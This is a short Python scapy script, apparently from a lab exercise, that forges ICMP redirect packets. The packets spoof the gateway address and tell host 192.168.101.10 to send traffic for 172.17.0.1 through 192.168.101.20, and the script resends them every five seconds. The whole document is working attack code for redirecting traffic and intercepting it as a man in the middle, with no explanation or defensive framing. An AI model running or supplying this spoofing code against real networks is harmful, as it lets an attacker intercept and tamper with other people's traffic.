from scapy.all import *
from time import sleep

ip = IP(src='192.168.101.1', dst='192.168.101.10')

icmp = ICMP(type=5, code=1)

icmp.gw = '192.168.101.20'

ip2 = IP(src='192.168.101.10', dst='172.17.0.1')

while True:
    send(ip/icmp/ip2/ICMP())
    sleep(5)


